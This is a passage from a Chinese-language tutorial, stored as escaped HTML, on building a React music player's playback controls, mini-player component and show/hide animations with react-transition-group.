class=\"hljs-literal\"\u003etrue\u003c/span\u003e;\n\u003c/code\u003e\u003c/pre\u003e\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003ecomponentDidUpdate\u003c/span\u003e\u003c/span\u003e() {\n\u0009//兼容手机端canplay事件触发后第一次调用play()方法无法自动播放的问题\n\u0009\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (this.isFirstPlay === \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e) {\n\u0009\u0009this.audioDOM.play();\n\u0009\u0009this.isFirstPlay = \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e;\n\u0009}\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e回到Album.js中给播放全部按钮添加事件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e/**\n * 播放全部\n */\nplayAll = () =\u0026gt; {\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (this.state.songs.length \u0026gt; 0) {\n        //添加播放歌曲列表\n        this.props.setSongs(this.state.songs);\n        this.props.changeCurrentSong(this.state.songs[0]);\n        this.props.showMusicPlayer(\u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e);\n    }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u0026lt;div className=\u003cspan class=\"hljs-string\"\u003e\"play-button\"\u003c/span\u003e onClick={this.playAll}\u0026gt;\n    \u0026lt;i className=\u003cspan class=\"hljs-string\"\u003e\"icon-play\"\u003c/span\u003e\u0026gt;\u0026lt;/i\u0026gt;\n    \u0026lt;span\u0026gt;播放全部\u0026lt;/span\u0026gt;\n\u0026lt;/div\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e给Player组件的\u003cstrong\u003eplayer\u003c/strong\u003e元素增加style控制显示和隐藏\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u0026lt;div className=\u003cspan class=\"hljs-string\"\u003e\"player\"\u003c/span\u003e ref=\u003cspan class=\"hljs-string\"\u003e\"player\"\u003c/span\u003e style={{display:this.props.showStatus === \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e ? \u003cspan class=\"hljs-string\"\u003e\"block\"\u003c/span\u003e : \u003cspan class=\"hljs-string\"\u003e\"none\"\u003c/span\u003e}}\u0026gt;\n  ...\n\u0026lt;/div\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e点击后会显示播放组件，然后进行歌曲播放\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e歌曲控制\u003c/h4\u003e\n\u003cp\u003e下面给播放组件增加歌曲模式切、上一首、下一首和播放暂停和换功能\u003c/p\u003e\n\u003cp\u003e歌曲模式切换，给元素添加点击事件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003echangePlayMode = () =\u0026gt; {\n\u0009\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (this.state.currentPlayMode === this.playModes.length - 1) {\n\u0009\u0009this.setState({currentPlayMode:0});\n\u0009} \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n\u0009\u0009this.setState({currentPlayMode:this.state.currentPlayMode + 1});\n\u0009}\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u0026lt;div className=\u003cspan class=\"hljs-string\"\u003e\"play-model-button\"\u003c/span\u003e  onClick={this.changePlayMode}\u0026gt;\n    \u0026lt;i className={\u003cspan class=\"hljs-string\"\u003e\"icon-\"\u003c/span\u003e + this.playModes[this.state.currentPlayMode] + \u003cspan class=\"hljs-string\"\u003e\"-play\"\u003c/span\u003e}\u0026gt;\u0026lt;/i\u0026gt;\n\u0026lt;/div\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e播放或暂停\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eplayOrPause = () =\u0026gt; {\n\u0009\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(this.audioDOM.paused){\n\u0009\u0009this.audioDOM.play();\n\u0009\u0009this.startImgRotate();\n\n\u0009\u0009this.setState({\n\u0009\u0009\u0009playStatus: \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e\n\u0009\u0009});\n\u0009}\u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e{\n\u0009\u0009this.audioDOM.pause();\n\u0009\u0009this.stopImgRotate();\n\n\u0009\u0009this.setState({\n\u0009\u0009\u0009playStatus: \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e\n\u0009\u0009});\n\u0009}\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u0026lt;div className=\u003cspan class=\"hljs-string\"\u003e\"play-button\"\u003c/span\u003e onClick={this.playOrPause}\u0026gt;\n    \u0026lt;i className={playButtonClass}\u0026gt;\u0026lt;/i\u0026gt;\n\u0026lt;/div\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e上一首、下一首\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eprevious = () =\u0026gt; {\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (this.props.playSongs.length \u0026gt; 0 \u0026amp;\u0026amp; this.props.playSongs.length !== 1) {\n        \u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e currentIndex = this.currentIndex;\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (this.state.currentPlayMode === 0) {  //列表播放\n            \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(currentIndex === 0){\n                currentIndex = this.props.playSongs.length - 1;\n            }\u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e{\n                currentIndex = currentIndex - 1;\n            }\n        } \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (this.state.currentPlayMode === 1) {  //单曲循环\n            currentIndex = this.currentIndex;\n        } \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {  //随机播放\n            \u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e index = parseInt(Math.random() * this.props.playSongs.length, 10);\n            currentIndex = index;\n        }\n        this.props.changeCurrentSong(this.props.playSongs[currentIndex]);\n        this.currentIndex = currentIndex;\n    }\n}\nnext = () =\u0026gt; {\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (this.props.playSongs.length \u0026gt; 0  \u0026amp;\u0026amp; this.props.playSongs.length !== 1) {\n        \u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e currentIndex = this.currentIndex;\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (this.state.currentPlayMode === 0) {  //列表播放\n            \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(currentIndex === this.props.playSongs.length - 1){\n                currentIndex = 0;\n            }\u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e{\n                currentIndex = currentIndex + 1;\n            }\n        } \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (this.state.currentPlayMode === 1) {  //单曲循环\n            currentIndex = this.currentIndex;\n        } \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {  //随机播放\n            \u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e index = parseInt(Math.random() * this.props.playSongs.length, 10);\n            currentIndex = index;\n        }\n        this.props.changeCurrentSong(this.props.playSongs[currentIndex]);\n        this.currentIndex = currentIndex;\n    }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u0026lt;div className=\u003cspan class=\"hljs-string\"\u003e\"previous-button\"\u003c/span\u003e onClick={this.previous}\u0026gt;\n    \u0026lt;i className=\u003cspan class=\"hljs-string\"\u003e\"icon-previous\"\u003c/span\u003e\u0026gt;\u0026lt;/i\u0026gt;\n\u0026lt;/div\u0026gt;\n...\n\u0026lt;div className=\u003cspan class=\"hljs-string\"\u003e\"next-button\"\u003c/span\u003e onClick={this.next}\u0026gt;\n    \u0026lt;i className=\u003cspan class=\"hljs-string\"\u003e\"icon-next\"\u003c/span\u003e\u0026gt;\u0026lt;/i\u0026gt;\n\u0026lt;/div\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e上一首下一首先判断播放模式，当播放模式为列表播放是直接当前位置+1，然后获取下一首歌曲，下一首反之。当播放模式为单曲循环的时候，继续播放当前歌曲。当播放模式为随机播放的时候获取0到歌曲列表长度中的一个随机整数进行播放。如果当前只有一首歌曲的时候播放模式不起作用\u003c/p\u003e\n\u003cp\u003e歌曲进度的拖拽使用Progress的props回调函数，给Progress组件添加\u003cstrong\u003eonDrag\u003c/strong\u003e和\u003cstrong\u003eonDragEnd\u003c/strong\u003e属性，并添加函数处理，constructor构造函数内增加\u003cstrong\u003edragProgress\u003c/strong\u003e属性记录拖拽的进度\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003ethis.dragProgress = 0;\n\u003c/code\u003e\u003c/pre\u003e\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u0026lt;Progress progress={this.state.playProgress}\n      onDrag={this.handleDrag}\n      onDragEnd={this.handleDragEnd}/\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003ehandleDrag = (progress) =\u0026gt; {\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (this.audioDOM.duration \u0026gt; 0) {\n            this.audioDOM.pause();\n            this.stopImgRotate();\n\n            this.setState({\n                playStatus: \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e\n            });\n            this.dragProgress = progress;\n        }\n    }\nhandleDragEnd = () =\u0026gt; {\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (this.audioDOM.duration \u0026gt; 0) {\n        \u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e currentTime = this.audioDOM.duration * this.dragProgress;\n        this.setState({\n            playProgress: this.dragProgress,\n            currentTime: currentTime\n        }, () =\u0026gt; {\n            this.audioDOM.currentTime = currentTime;\n            this.audioDOM.play();\n            this.startImgRotate();\n\n            this.setState({\n                playStatus: \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e\n            });\n            this.dragProgress = 0;\n        });\n    }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e拖拽中记录拖拽的进度，当拖拽结束后获取拖拽后的播放时间和拖拽进度更新Player组件，组件更新后从拖拽后的时间继续播放\u003c/p\u003e\n\u003cp\u003e给audio添加\u003cstrong\u003eended\u003c/strong\u003e事件，进行播放完成后的处理。同时添加\u003cstrong\u003eerror\u003c/strong\u003e事件处理\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003ethis.audioDOM.addEventListener(\u003cspan class=\"hljs-string\"\u003e\"ended\"\u003c/span\u003e, () =\u0026gt; {\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (this.props.playSongs.length \u0026gt; 1) {\n        \u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e currentIndex = this.currentIndex;\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (this.state.currentPlayMode === 0) {  //列表播放\n            \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(currentIndex === this.props.playSongs.length - 1){\n                currentIndex = 0;\n            }\u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e{\n                currentIndex = currentIndex + 1;\n            }\n        } \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (this.state.currentPlayMode === 1) {  //单曲循环\n            //继续播放当前歌曲\n            this.audioDOM.play();\n            \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e;\n        } \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {  //随机播放\n            \u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e index = parseInt(Math.random() * this.props.playSongs.length, 10);\n            currentIndex = index;\n        }\n        this.props.changeCurrentSong(this.props.playSongs[currentIndex]);\n        this.currentIndex = currentIndex;\n\n    } \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (this.state.currentPlayMode === 1) {  //单曲循环\n            //继续播放当前歌曲\n            this.audioDOM.play();\n        } \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n            //暂停\n            this.audioDOM.pause();\n            this.stopImgRotate();\n\n            this.setState({\n                playProgress: 0,\n                currentTime: 0,\n                playStatus: \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e\n            });\n        }\n    }\n}, \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e);\n\nthis.audioDOM.addEventListener(\u003cspan class=\"hljs-string\"\u003e\"error\"\u003c/span\u003e, () =\u0026gt; {alert(\u003cspan class=\"hljs-string\"\u003e\"加载歌曲出错！\"\u003c/span\u003e)}, \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e);\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eerror事件只是简单的做了一个提示，其实是可以自动切换下一首歌曲的\u003c/p\u003e\n\u003cp\u003e效果图如下\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/3/160ba0518b76e674?w=434\u0026amp;h=877\u0026amp;f=gif\u0026amp;s=5014616\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e开发Mini播放组件\u003c/h3\u003e\n\u003cp\u003eMini播放组件依赖audio标签还有歌曲的当前播放时间、总是长、播放进度。这些相关属性在Player组件中已经被使用到了，所以这里把Mini组件作为Player组件的子组件\u003c/p\u003e\n\u003cp\u003e在play目录下新建\u003cstrong\u003eMiniPlayer.js\u003c/strong\u003e和\u003cstrong\u003eminiplayer.styl\u003c/strong\u003e。MiniPlayer接收当前歌曲song，和播放进度。同时也需要引入Progress展示播放进度\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eMiniPlayer.js\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eimport React from \u003cspan class=\"hljs-string\"\u003e\"react\"\u003c/span\u003e\nimport Progress from \u003cspan class=\"hljs-string\"\u003e\"./Progress\"\u003c/span\u003e\n\nimport \u003cspan class=\"hljs-string\"\u003e\"./miniplayer.styl\"\u003c/span\u003e\n\nclass MiniPlayer extends React.Component {\n    \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003erender\u003c/span\u003e\u003c/span\u003e() {\n        \u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e song = this.props.song;\n\n        \u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e playerStyle = {};\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (this.props.showStatus === \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e) {\n            playerStyle = {display:\u003cspan class=\"hljs-string\"\u003e\"none\"\u003c/span\u003e};\n        }\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (!song.img) {\n            song.img = require(\u003cspan class=\"hljs-string\"\u003e\"@/assets/imgs/music.png\"\u003c/span\u003e);\n        }\n\n        \u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e imgStyle = {};\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (song.playStatus === \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e) {\n            imgStyle[\u003cspan class=\"hljs-string\"\u003e\"WebkitAnimationPlayState\"\u003c/span\u003e] = \u003cspan class=\"hljs-string\"\u003e\"running\"\u003c/span\u003e;\n            imgStyle[\u003cspan class=\"hljs-string\"\u003e\"animationPlayState\"\u003c/span\u003e] = \u003cspan class=\"hljs-string\"\u003e\"running\"\u003c/span\u003e;\n        } \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n            imgStyle[\u003cspan class=\"hljs-string\"\u003e\"WebkitAnimationPlayState\"\u003c/span\u003e] = \u003cspan class=\"hljs-string\"\u003e\"paused\"\u003c/span\u003e;\n            imgStyle[\u003cspan class=\"hljs-string\"\u003e\"animationPlayState\"\u003c/span\u003e] = \u003cspan class=\"hljs-string\"\u003e\"paused\"\u003c/span\u003e;\n        }\n\n        \u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e playButtonClass = song.playStatus === \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e ? \u003cspan class=\"hljs-string\"\u003e\"icon-pause\"\u003c/span\u003e : \u003cspan class=\"hljs-string\"\u003e\"icon-play\"\u003c/span\u003e;\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e (\n            \u0026lt;div className=\u003cspan class=\"hljs-string\"\u003e\"mini-player\"\u003c/span\u003e style={playerStyle}\u0026gt;\n                \u0026lt;div className=\u003cspan class=\"hljs-string\"\u003e\"player-img rotate\"\u003c/span\u003e style={imgStyle}\u0026gt;\n                    \u0026lt;img src={song.img} alt={song.name}/\u0026gt;\n                \u0026lt;/div\u0026gt;\n                \u0026lt;div className=\u003cspan class=\"hljs-string\"\u003e\"player-center\"\u003c/span\u003e\u0026gt;\n                    \u0026lt;div className=\u003cspan class=\"hljs-string\"\u003e\"progress-wrapper\"\u003c/span\u003e\u0026gt;\n                        \u0026lt;Progress \u003cspan class=\"hljs-built_in\"\u003edisable\u003c/span\u003eButton={\u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e} progress={this.props.progress}/\u0026gt;\n                    \u0026lt;/div\u0026gt;\n                    \u0026lt;span className=\u003cspan class=\"hljs-string\"\u003e\"song\"\u003c/span\u003e\u0026gt;\n\u0009                    {song.name}\n\u0009                \u0026lt;/span\u0026gt;\n                    \u0026lt;span className=\u003cspan class=\"hljs-string\"\u003e\"singer\"\u003c/span\u003e\u0026gt;\n\u0009                    {song.singer}\n\u0009                \u0026lt;/span\u0026gt;\n                \u0026lt;/div\u0026gt;\n                \u0026lt;div className=\u003cspan class=\"hljs-string\"\u003e\"player-right\"\u003c/span\u003e\u0026gt;\n                    \u0026lt;i className={playButtonClass}\u0026gt;\u0026lt;/i\u0026gt;\n                    \u0026lt;i className=\u003cspan class=\"hljs-string\"\u003e\"icon-next ml-10\"\u003c/span\u003e\u0026gt;\u0026lt;/i\u0026gt;\n                \u0026lt;/div\u0026gt;\n                \u0026lt;div className=\u003cspan class=\"hljs-string\"\u003e\"filter\"\u003c/span\u003e\u0026gt;\u0026lt;/div\u0026gt;\n            \u0026lt;/div\u0026gt;\n        );\n    }\n}\n\n\u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e default MiniPlayer\n\u003c/code\u003e\u003c/pre\u003e\u003cblockquote\u003e\n\u003cp\u003eminiplayer.styl代码请在源码中查看\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e在Player组件中导入MiniPlayer\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eimport MiniPlayer from \u003cspan class=\"hljs-string\"\u003e\"./MiniPlayer\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e放置在如下位置，传入\u003cstrong\u003esong\u003c/strong\u003e和\u003cstrong\u003eplayProgress\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u0026lt;div className=\u003cspan class=\"hljs-string\"\u003e\"player-container\"\u003c/span\u003e\u0026gt;\n    ...\n    \u0026lt;MiniPlayer song={song} progress={this.state.playProgress}/\u0026gt;\n\u0026lt;/div\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e在MiniPlayer组件中调用父组件的播放暂停和下一首方法控制歌曲。先在MiniPlayer中编写处理点击事件的方法\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003ehandlePlayOrPause = (e) =\u0026gt; {\n\u0009e.stopPropagation();\n\u0009\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (this.props.song.url) {\n\u0009\u0009//调用父组件的播放或暂停方法\n\u0009\u0009this.props.playOrPause();\n\u0009}\n}\nhandleNext = (e) =\u0026gt; {\n\u0009e.stopPropagation();\n\u0009\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (this.props.song.url) {\n\u0009\u0009//调用父组件播放下一首方法\n\u0009\u0009this.props.next();\n\u0009}\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e添加点击事件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u0026lt;div className=\u003cspan class=\"hljs-string\"\u003e\"player-right\"\u003c/span\u003e\u0026gt;\n    \u0026lt;i className={playButtonClass} onClick={this.handlePlayOrPause}\u0026gt;\u0026lt;/i\u0026gt;\n    \u0026lt;i className=\u003cspan class=\"hljs-string\"\u003e\"icon-next ml-10\"\u003c/span\u003e onClick={this.handleNext}\u0026gt;\u0026lt;/i\u0026gt;\n\u0026lt;/div\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e在Player组件中传入\u003cstrong\u003eplayOrPause\u003c/strong\u003e和\u003cstrong\u003enext\u003c/strong\u003e方法\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u0026lt;MiniPlayer song={song} progress={this.state.playProgress}\n    playOrPause={this.playOrPause}\n    next={this.next}/\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003ePlayer和MiniPlayer两个组件的显示状态是相反的，在某一个时候只会有一个显示另一个隐藏，接下来处理Player组件和MiniPlayer组件的显示和隐藏。在Player组件中增加显示和隐藏的两个方法\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003ehidePlayer = () =\u0026gt; {\n    this.props.showMusicPlayer(\u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e);\n}\nshowPlayer = () =\u0026gt; {\n    this.props.showMusicPlayer(\u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e);\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u0026lt;div className=\u003cspan class=\"hljs-string\"\u003e\"header\"\u003c/span\u003e\u0026gt;\n    \u0026lt;span className=\u003cspan class=\"hljs-string\"\u003e\"header-back\"\u003c/span\u003e onClick={this.hidePlayer}\u0026gt;\n        ...\n    \u0026lt;/span\u0026gt;\n    ...\n\u0026lt;/div\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e将显示状态\u003cstrong\u003eshowStatus\u003c/strong\u003e和显示的方法\u003cstrong\u003eshowPlayer\u003c/strong\u003e传给MiniPlayer组件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u0026lt;MiniPlayer song={song} progress={this.state.playProgress}\n    playOrPause={this.playOrPause}\n    next={this.next}\n    showStatus={this.props.showStatus}\n    showMiniPlayer={this.showPlayer}/\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003ePlayer中的hidePlayer调用后，更新redux的\u003cstrong\u003eshowStatus\u003c/strong\u003e为false，触发render，将showStatus传给MiniPlayer，MiniPlayer根据showStatus来决定显示还是隐藏\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e播放组件和歌曲列表点击动画\u003c/h3\u003e\n\u003ch4 class=\"heading\"\u003e播放组件显示和隐藏动画\u003c/h4\u003e\n\u003cp\u003e单纯的让播放组件显示和隐藏太生硬了，我们为播放组件的显示和隐藏的动画。这里会用到上一节介绍的\u003cstrong\u003ereact-transition-group\u003c/strong\u003e，这个插件的简单使用请戳上一节\u003ca target=\"_blank\" href=\"https://juejin.im/post/5a40aea26fb9a044fd12005e#heading-4\"\u003e实现动画\u003c/a\u003e。这个动画会用到react-transition-group中提供的钩子函数，具体请看下面\u003c/p\u003e\n\u003cp\u003e在Player组件中引入\u003cstrong\u003eCSSTransition\u003c/strong\u003e动画组件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eimport { CSSTransition } from \u003cspan class=\"hljs-string\"\u003e\"react-transition-group\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e用CSSTransition包裹播放组件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u0026lt;div className=\u003cspan class=\"hljs-string\"\u003e\"player-container\"\u003c/span\u003e\u0026gt;\n    \u0026lt;CSSTransition \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e={this.props.showStatus} timeout={300} classNames=\u003cspan class=\"hljs-string\"\u003e\"player-rotate\"\u003c/span\u003e\u0026gt;\n    \u0026lt;div className=\u003cspan class=\"hljs-string\"\u003e\"player\"\u003c/span\u003e ref=\u003cspan class=\"hljs-string\"\u003e\"player\"\u003c/span\u003e style={{display:this.props.showStatus === \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e ? \u003cspan class=\"hljs-string\"\u003e\"block\"\u003c/span\u003e : \u003cspan class=\"hljs-string\"\u003e\"none\"\u003c/span\u003e}}\u0026gt;\n        ...\n    \u0026lt;/div\u0026gt;\n    \u0026lt;/CSSTransition\u0026gt;\n    \u0026lt;MiniPlayer song={song} progress={this.state.playProgress}\n                playOrPause={this.playOrPause}\n                next={this.next}\n                showStatus={this.props.showStatus}\n                showMiniPlayer={this.showPlayer}/\u0026gt;\n\u0026lt;/div\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这个时候将player元素的样式交给CSSTransition的钩子函数来控制，去掉player元素的style\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u0026lt;div className=\u003cspan class=\"hljs-string\"\u003e\"player\"\u003c/span\u003e ref=\u003cspan class=\"hljs-string\"\u003e\"player\"\u003c/span\u003e\u0026gt;\n...\n\u0026lt;/div\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e然后给CSSTransition添加\u003cstrong\u003eonEnter\u003c/strong\u003e和\u003cstrong\u003eonExited\u003c/strong\u003e钩子函数，onEnter在in为true，组件开始变成进入状态时回调，onExited在in为false，组件状态已经变成离开状态时回调\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u0026lt;CSSTransition \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e={this.props.showStatus} timeout={300} classNames=\u003cspan class=\"hljs-string\"\u003e\"player-rotate\"\u003c/span\u003e\n   onEnter={() =\u0026gt; {\n       this.playerDOM.style.display = \u003cspan class=\"hljs-string\"\u003e\"block\"\u003c/span\u003e;\n   }}\n   onExited={() =\u0026gt; {\n       this.playerDOM.style.display = \u003cspan class=\"hljs-string\"\u003e\"none\"\u003c/span\u003e;\n   }}\u0026gt;\n   ...\n\u0026lt;/CSSTransition\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eplayer样式如下\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e.player\n  position: fixed\n  top: 0\n  left: 0\n  z-index: 1001\n  width: 100%\n  height: 100%\n  color: \u003cspan class=\"hljs-comment\"\u003e#FFFFFF\u003c/span\u003e\n  background-color: \u003cspan class=\"hljs-comment\"\u003e#212121\u003c/span\u003e\n  display: none\n  transform-origin: 0 bottom\n  \u0026amp;.player-rotate-enter\n    transform: rotateZ(90deg)\n    \u0026amp;.player-rotate-enter-active\n      transition: transform .3s\n      transform: rotateZ(0deg)\n  \u0026amp;.player-rotate-exit\n    transform: rotateZ(0deg) translate3d(0, 0, 0)\n    \u0026amp;.player-rotate-exit-active\n      transition: all .3s\n      transform: rotateZ(90deg) translate3d(100%, 0, 0)\n\u003c/code\u003e\u003c/pre\u003e\u003ch4 class=\"heading\"\u003e歌曲点击音符下落动画\u003c/h4\u003e\n\u003cp\u003e回到Album组件中，在每一首歌曲点击的时候我们在每个点击的位置出现一个音符，然后开始以抛物线轨迹下落。利用x轴和y轴的\u003cstrong\u003etranslate\u003c/strong\u003e进行过渡，使用两个元素，外层元素y轴平移，内层元素x轴平移。过渡完成后使用css3的\u003cstrong\u003etransitionend\u003c/strong\u003e用来监听元素过渡完成，然后将位置进行重置，以便下一次运动\u003c/p\u003e\n\u003cp\u003e在src下新建\u003cstrong\u003eutil\u003c/strong\u003e目录然后新建\u003cstrong\u003eevent.js\u003c/strong\u003e用来获取transitionend事件名称，兼容低版本webkit内核浏览器\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eevent.js\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode 